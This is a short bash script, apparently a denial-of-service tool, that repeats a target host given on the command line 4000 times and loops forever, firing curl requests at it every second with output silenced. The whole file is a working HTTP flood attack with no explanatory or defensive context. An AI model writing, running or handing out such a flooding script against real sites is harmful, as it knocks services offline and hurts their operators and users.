#!/bin/bash

#echo -ne "GET $2 HTTP/1.0\n\n" > /tmp/.flood_request

for i in `seq 4000`; do
    FLOOD_LIST="$FLOOD_LIST https://$1/"
done

while [ true ]; 
do

    curl -m 10 --no-keepalive --connect-timeout 2 $FLOOD_LIST &> /dev/null &
    sleep 1;

done
